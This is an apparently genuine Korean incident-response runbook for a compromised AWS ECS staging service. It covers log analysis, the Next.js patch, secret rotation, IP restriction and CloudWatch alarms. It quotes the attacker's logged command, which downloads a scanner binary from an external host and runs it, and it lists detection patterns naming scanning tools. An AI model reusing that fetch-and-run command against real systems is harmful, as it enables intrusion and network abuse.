# AWS ECS 보안 사고 대응 기록 (2026-05)

## 1. 개요

2026년 5월, AWS Trust & Safety로부터 NAT Gateway를 통한 비정상 outbound scanning activity 신고를 받았다. 조사 결과, `mcm-ieps-staging-next` ECS Fargate 서비스 컨테이너에서 `scanner_linux` 실행 흔적이 CloudWatch Logs에 반복적으로 확인되었다.

이번 문서는 당시 원인 분석, 즉시 조치, 복구, 재발 방지 조치를 정리한 운영 기록이다. 이후 staging/production 운영 시 보안 점검 체크리스트와 사고 대응 런북으로 재사용한다.

## 2. 주요 증상

CloudWatch Logs에서 다음과 같은 로그가 반복적으로 확인되었다.

```text
Command failed: wget -q https://tli.sh/bIw -O scanner_linux
scanner_linux -t 1000
wget: can't open 'scanner_linux': Text file busy
```

특징:

- 여러 ECS Task ID에서 동일한 패턴이 반복되었다.
- 단일 컨테이너의 일회성 감염이 아니라, Task가 재시작되거나 교체될 때마다 같은 공격이 재현된 형태였다.
- `scanner_linux -t 1000` 실행 흔적이 있어 실제 outbound scanning이 발생한 것으로 판단했다.
- AWS 신고 내용과 CloudWatch 로그가 일치했다.

## 3. 조사 과정

### 3.1 EC2 Bastion 확인

처음에는 NAT Gateway 뒤의 EC2 인스턴스가 원인일 가능성을 검토했다.

확인 항목:

- SSM Session Manager 접속
- `/var/log`, `/tmp`, `/var/tmp` 검색
- 실행 중 프로세스 확인
- systemd timer/service 확인
- 네트워크 연결 확인

결론:

- EC2 bastion에서는 `scanner_linux`, `tli.sh`, 대량 스캔 프로세스 흔적이 발견되지 않았다.
- 이후 ECS Task 로그에서 직접적인 증거가 확인되어 원인 범위를 ECS로 좁혔다.

### 3.2 ECS/CloudWatch 로그 확인

CloudWatch Logs Insights에서 다음 키워드로 검색했다.

```sql
fields @timestamp, @logStream, @message
| filter @message like /scanner_linux|tli\.sh|wget/
| sort @timestamp desc
| limit 100
```

확인된 로그 스트림 예:

```text
next/next/<task-id>
```

이를 통해 문제가 `mcm-ieps-staging-next` ECS 서비스에서 발생했음을 확인했다.

### 3.3 Docker 이미지 파일시스템 확인

로컬에서 실행 중이던 이미지 파일시스템을 export한 뒤 검색했다.

```powershell
$img = "sha256:<image-digest>"
$cid = docker create $img
docker export $cid -o C:\rootfs.tar
docker rm $cid
mkdir C:\rootfs
tar -xf C:\rootfs.tar -C C:\rootfs

Get-ChildItem C:\rootfs -Recurse -File |
  Select-String -Pattern "scanner_linux","tli.sh","wget","curl","child_process","exec\(","spawn\(","masscan","nmap"
```

결론:

- 이미지 내부에서 `scanner_linux`나 `tli.sh` 직접 문자열은 발견되지 않았다.
- 따라서 Dockerfile 레이어에 악성 파일이 포함된 것이 아니라, 런타임에서 다운로드/실행된 것으로 판단했다.

### 3.4 Task Definition 확인

ECS Task Definition을 확인했다.

확인 항목:

- `entryPoint`
- `command`
- `environment`
- `secrets`
- `image`

결론:

- `entryPoint: null`
- `command: null`
- 환경변수/secret에 악성 명령 없음
- Task Definition 자체에 `wget` 또는 scanner 실행 명령이 주입된 정황은 없었다.

### 3.5 원인 후보 정리

가장 가능성이 높았던 원인:

1. 인터넷에 공개된 staging ALB가 자동 봇넷 스캔 대상이 됨.
2. 당시 앱이 Next.js `15.1.0`을 사용 중이었고, 이는 공개된 middleware/proxy bypass 계열 취약점에 취약한 버전이었다.
3. 앱에는 인증된 editor/admin만 사용할 수 있는 수집/파싱 실행 API가 있었다.
4. 미들웨어 우회 또는 약한 admin credential을 통해 실행성 API가 호출되었을 가능성이 있다.
5. 그 결과 컨테이너 내부에서 `wget https://tli.sh/... -O scanner_linux` 및 `scanner_linux -t 1000` 실행이 발생했다.

중요한 판단:

- 로컬 PC의 AWS credential 유출 정황은 없었다.
- AWS Console/CloudShell 사용 이력상 로컬 AWS credential은 저장되어 있지 않았다.
- 이번 사고는 “개인 PC 해킹”보다는 “인터넷 공개 staging + 취약 프레임워크 버전 + 실행성 API 노출” 조합으로 보는 것이 타당했다.

## 4. 즉시 대응 조치

### 4.1 ECS 서비스 중지

ECS 서비스 desired count를 0으로 내려 추가 outbound scanning을 차단했다.

```bash
aws ecs update-service \
  --cluster mcm-ieps-staging \
  --service mcm-ieps-staging-next \
  --desired-count 0 \
  --region ap-northeast-2
```

### 4.2 Secret 회전

Secrets Manager의 앱 secret을 갱신했다.

대상:

- `AUTH_SECRET`
- `ADMIN_PASSWORD`

추가로 검토할 대상:

- `DATABASE_URL` 내 DB 비밀번호
- 장기 운영 전 production용 credential 전체

`AUTH_SECRET` 생성 예:

```bash
openssl rand -base64 32
```

PowerShell 예:

```powershell
$bytes = New-Object byte[] 32
[System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
[Convert]::ToBase64String($bytes)
```

### 4.3 Admin 계정 재시드

운영 DB에 접속해 기존 admin 계정을 삭제한 뒤, 새 `ADMIN_PASSWORD`로 재시드했다.

RDS는 private subnet에 있어 CloudShell에서 직접 접속할 수 없었다. SSM으로 bastion EC2에 접속한 뒤 `psql`을 사용했다.

```bash
PGPASSWORD='<db-password>' PGSSLMODE=require \
psql -h <aurora-endpoint> -U mcm -d mcm -p 5432
```

admin 확인:

```sql
SELECT user_id, email, role, status FROM users WHERE role = 'admin';
```

admin 삭제:

```sql
DELETE FROM users WHERE role = 'admin';
```

이후 앱 재기동 시 환경변수 기반 admin seed가 다시 실행되도록 했다.

## 5. 패치 및 복구

### 5.1 Next.js 보안 업데이트

기존:

```json
"next": "15.1.0"
```

변경:

```json
"next": "15.5.18"
```

또한 Next 내부의 취약한 `postcss` 중첩 의존성을 피하기 위해 `overrides`를 추가했다.

```json
"overrides": {
  "postcss": "$postcss"
}
```

검증:

```bash
npm audit
npx tsc --noEmit
npm run build
```

결과:

- `npm audit`: `found 0 vulnerabilities`
- TypeScript 검사 통과
- Next production build 성공

### 5.2 이미지 클린 빌드 및 ECR 푸시

로컬에서 새 이미지를 no-cache로 빌드한 뒤 ECR에 push했다.

```powershell
cd "C:\CodingProject\MCM"
$REGION="ap-northeast-2"
$ACCOUNT="<account-id>"
$REPO="$ACCOUNT.dkr.ecr.$REGION.amazonaws.com/mcm-ieps-staging-next"

docker build --no-cache -f frontend/Dockerfile -t "${REPO}:latest" .
docker push "${REPO}:latest"
```

ECR 로그인은 CloudShell에서 ECR password를 발급받아 로컬 Docker에 적용했다.

CloudShell:

```bash
aws ecr get-login-password --region ap-northeast-2
```

로컬 PowerShell:

```powershell
docker login --username AWS --password "<token>" "<account-id>.dkr.ecr.ap-northeast-2.amazonaws.com"
```

### 5.3 ECS 재배포

```bash
aws ecs update-service \
  --cluster mcm-ieps-staging \
  --service mcm-ieps-staging-next \
  --desired-count 1 \
  --force-new-deployment \
  --region ap-northeast-2

aws ecs wait services-stable \
  --cluster mcm-ieps-staging \
  --services mcm-ieps-staging-next \
  --region ap-northeast-2
```

로그 확인:

```bash
aws logs tail /ecs/mcm-ieps-staging/next --since 20m --follow --region ap-northeast-2
```

정상 로그:

```text
Next.js 15.5.18
Ready in xxxxms
```

재배포 후 20분 이상 `scanner_linux`, `tli.sh`, `wget`, `Command failed` 등 이상 로그가 재발하지 않았다.

## 6. 재발 방지 조치

### 6.1 ALB IP 제한

staging ALB의 HTTP inbound를 `0.0.0.0/0`에서 개발자 공인 IP `/32`로 제한했다.

공인 IP 확인:

```powershell
curl.exe https://checkip.amazonaws.com
```

Security Group Source 예:

```text
<public-ip>/32
```

Terraform 기준 위치:

```text
infra/aws/main.tf
resource "aws_security_group" "alb"
```

기존 staging 설정:

```hcl
ingress {
  from_port   = 80
  to_port     = 80
  protocol    = "tcp"
  cidr_blocks = ["0.0.0.0/0"]
}
```

주의:

- 콘솔에서만 변경하면 이후 `terraform apply` 때 원복될 수 있다.
- 장기적으로는 허용 CIDR을 Terraform 변수로 분리해야 한다.

### 6.2 CloudWatch 로그 알람

CloudWatch Log Group:

```text
/ecs/mcm-ieps-staging/next
```

Metric Filter pattern:

```text
?scanner_linux ?tli.sh ?masscan ?nmap ?"Command failed"
```

Metric:

```text
Namespace: MCM/Security
Metric name: SuspiciousCommandLog
Value: 1
```

Alarm:

```text
Alarm name: mcm-ieps-staging-suspicious-command-log
Condition: Sum >= 1 for 1 minute
Action: SNS email notification
```

SNS:

```bash
aws sns create-topic --name mcm-ieps-security-alerts --region ap-northeast-2
aws sns subscribe \
  --topic-arn arn:aws:sns:ap-northeast-2:<account-id>:mcm-ieps-security-alerts \
  --protocol email \
  --notification-endpoint <email> \
  --region ap-northeast-2
```

Alarm 생성:

```bash
aws cloudwatch put-metric-alarm \
  --alarm-name mcm-ieps-staging-suspicious-command-log \
  --namespace MCM/Security \
  --metric-name SuspiciousCommandLog \
  --statistic Sum \
  --period 60 \
  --evaluation-periods 1 \
  --threshold 1 \
  --comparison-operator GreaterThanOrEqualToThreshold \
  --treat-missing-data notBreaching \
  --alarm-actions arn:aws:sns:ap-northeast-2:<account-id>:mcm-ieps-security-alerts \
  --region ap-northeast-2
```

구독 메일은 반드시 Confirm subscription을 완료해야 한다.

### 6.3 수동 점검용 Logs Insights 쿼리

```sql
fields @timestamp, @logStream, @message
| filter @message like /scanner_linux|tli\.sh|wget|curl|masscan|nmap|Command failed|child_process/
| sort @timestamp desc
| limit 100
```

운영 권장:

- 배포 직후 20분 이상 확인
- 사고 후 24시간 동안 주기적으로 확인
- 이후 일일/주간 점검 쿼리로 저장

### 6.4 `backendUrl` 하드닝

위험 지점:

- `/api/collect/start`
- `/api/parse/start`
- `frontend/lib/ieps/job-runner.ts`
- `frontend/lib/ieps/aws-job-queue.ts`
- `scraper/scripts/aws-worker.ts`

기존에는 요청 body의 `backendUrl`이 CLI의 `--backend=` 인자로 전달될 수 있었다. 운영 Linux에서 shell injection은 제한적이지만, SSRF 또는 내부망 호출 유도 가능성이 있어 차단했다.

조치:

- production 또는 SQS 모드에서는 요청/메시지의 `backendUrl`을 무시한다.
- 로컬 개발 모드에서만 `backendUrl` 입력을 허용한다.
- SQS worker도 메시지의 `backendUrl`을 신뢰하지 않는다.

추가된 helper:

```ts
export function resolveJobBackendUrl(input?: string): string | undefined {
  if (process.env.NODE_ENV === "production" || process.env.MCM_JOB_QUEUE_MODE === "sqs") {
    return undefined;
  }
  return input;
}
```

Worker 측도 SQS 실행 환경에서는 메시지의 `backendUrl`을 제거하도록 처리했다.

검증:

- frontend TypeScript 검사 통과
- frontend production build 통과
- 재배포 후 정상 기동 확인

## 7. AWS Trust & Safety 회신 내용

회신에 포함한 내용:

- 신고된 outbound scanning activity 확인
- 원인이 ECS Fargate 서비스에서 발생했음을 확인
- 서비스 중지
- `AUTH_SECRET`, `ADMIN_PASSWORD` 회전
- admin 계정 재시드
- Next.js 취약 버전 패치
- 클린 이미지 재빌드 및 ECR 푸시
- ECS 재배포
- ALB IP 제한 적용
- CloudWatch/SNS 알람 구성
- 재배포 후 로그 모니터링 결과 이상 없음

예시:

```text
Hello AWS Trust & Safety Team,

We investigated the reported outbound scanning activity and identified that it originated from our ECS Fargate service.

Immediate actions taken:
- Stopped the affected ECS service by setting desired count to 0.
- Rotated application secrets including AUTH_SECRET and ADMIN_PASSWORD.
- Removed and re-seeded the admin account.
- Upgraded Next.js from 15.1.0 to 15.5.18.
- Rebuilt the application image from a clean local source and pushed a new ECR image.
- Redeployed the ECS service with the patched image.
- Restricted staging ALB access by IP allowlist.
- Added CloudWatch/SNS alerting for suspicious command logs.
- Hardened job execution routes to ignore externally supplied backendUrl in production/SQS mode.
- Monitored CloudWatch logs after redeployment and confirmed no further scanner_linux, wget, or tli.sh activity.

We will continue monitoring logs and improving the security posture of the staging environment.

Regards,
```

## 8. 운영 전 추가 권장 사항

정식 런칭 전에는 staging의 IP 제한만으로는 부족하다. production에서는 전 세계 접속을 허용하되 다음 방어 계층을 추가한다.

권장 구성:

- CloudFront + AWS WAF를 ALB 앞에 배치
- WAF Managed Rules 적용
  - CommonRuleSet
  - KnownBadInputsRuleSet
  - AmazonIpReputationList
  - SQLiRuleSet
  - LinuxRuleSet
- 로그인/API rate limit
- 관리자 페이지 별도 보호
  - IP allowlist
  - MFA
  - 별도 admin 도메인
  - Cloudflare Access 또는 Cognito
- 모든 API route 내부에서 서버 측 인증 가드 유지
  - `requireAuthenticated()`
  - `requireEditor()`
- 미들웨어는 보조 방어로만 간주
- GuardDuty 활성화
- AWS Budget 알람 설정
- ECR image scan 확인
- Dependency update 주기화

## 9. 교훈

핵심 교훈:

- AWS에 공개된 ALB는 생성 직후부터 자동 봇넷 스캔 대상이 된다.
- staging이라도 전 세계 공개 상태로 두면 production과 거의 같은 공격면을 가진다.
- 미들웨어 기반 인증은 편리하지만, API route 내부 인증 가드를 대체하면 안 된다.
- `child_process`, `spawn`, worker queue, 외부 URL 입력은 별도 보안 검토가 필요하다.
- Secret 회전, 이미지 클린 빌드, ECR 정리, 로그 모니터링까지 한 세트로 처리해야 한다.

이번 사고는 데이터 유출보다 “컨테이너를 발판으로 한 outbound scanning” 성격이 강했다. 그러나 동일한 침투 경로가 더 위험한 payload로 이어질 수 있으므로, 초기 대응과 재발 방지 조치를 production 수준으로 수행하는 것이 맞다.

